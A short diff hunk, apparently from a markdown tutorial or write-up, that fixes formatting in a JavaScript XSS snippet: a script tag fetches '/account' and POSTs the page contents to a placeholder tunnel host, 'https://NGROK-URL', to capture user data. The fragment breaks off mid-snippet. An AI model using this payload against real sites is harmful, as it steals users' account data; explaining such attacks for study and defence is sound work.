@@ -13,8 +13,8 @@ http server capture user data by either sending the data in a query or in the bo
 ```js
   <script>
       fetch('/account)
-          • then(p => p.text())
-          • then(t =>
+          .then(p => p.text())
+          .then(t =>
           fetch('https://NGROK-URL', {
             method: "POST",
             headers: { 'Content-Type':'application/json' },
